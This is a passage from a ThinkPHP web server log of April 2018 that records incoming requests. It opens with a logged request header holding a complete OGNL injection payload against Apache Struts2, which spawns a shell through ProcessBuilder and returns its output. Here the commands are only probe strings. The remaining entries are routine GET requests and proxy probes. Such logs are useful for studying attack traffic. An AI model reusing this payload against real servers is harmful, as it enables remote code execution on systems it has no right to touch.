  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'whoami\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'echo windows--2017\'}:{\'/bin/bash\',\'-c\',\'echo linux--2017\'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T22:47:50+08:00 ] 172.16.0.5 123.151.42.61 GET /
[ log ] www.baidu.com/ [运行时间：0.013952s][吞吐率：71.67req/s] [内存消耗：1,678.36kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'proxy-connection' => 'Keep-Alive',
  'content-type' => 'text/html',
  'accept' => '*/*',
  'host' => 'www.baidu.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T23:02:23+08:00 ] 172.16.0.5 60.191.38.78 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.018835s][吞吐率：53.09req/s] [内存消耗：1,678.49kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
